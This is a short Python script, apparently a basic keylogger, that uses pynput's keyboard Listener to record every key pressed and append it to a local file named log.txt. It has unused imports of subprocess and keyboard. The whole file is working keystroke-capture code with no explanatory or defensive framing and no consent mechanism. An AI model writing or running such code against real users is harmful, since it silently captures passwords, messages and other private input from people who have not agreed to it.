from subprocess import *
from pynput.keyboard import Listener 
import keyboard

def logger(key):
	logger = str(key)
	with open('log.txt','a' ) as log:
		log.write(logger)

with Listener(on_press=logger) as listener:listener.join() 